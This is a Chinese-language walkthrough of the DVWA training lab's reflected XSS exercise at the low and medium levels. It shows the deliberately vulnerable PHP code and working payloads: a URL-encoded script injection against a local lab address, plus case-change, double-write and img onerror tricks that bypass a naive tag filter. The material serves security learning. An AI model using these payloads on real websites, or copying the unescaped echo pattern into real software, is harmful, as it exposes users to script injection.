<center>XSS Reflected反射型xss</center>





[toc]









## XSS Reflected反射型xss

> XSS Reflected反射型xss



















### 1. low

> 低级

```php

<?php

header ("X-XSS-Protection: 0");

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Feedback for end user
    echo '<pre>Hello ' . $_GET[ 'name' ] . '</pre>';
}

```

> 没有任何防护

```shell
http://192.168.0.111:8000/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%28%2Fxss%2F%29%3C%2Fscript%3E#
```









### 2. medium

> 中级
>
> 代码

```php

<?php

header ("X-XSS-Protection: 0");

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Get input
    $name = str_replace( '<script>', '', $_GET[ 'name' ] );

    // Feedback for end user
    echo "<pre>Hello ${name}</pre>";
}
```

> str_replace: 字符串替换。 区分大小写。
>
> [runoob](https://www.runoob.com/php/func-string-str-replace.html)

> 攻击： 

```shell
# 大写
<Script>alert(/xss/)</script>

# 双写
<scr<script>ipt>alert(/xss/)</script>

# 其他元素
<img src=1 onerror=alert(/xss/)>
```

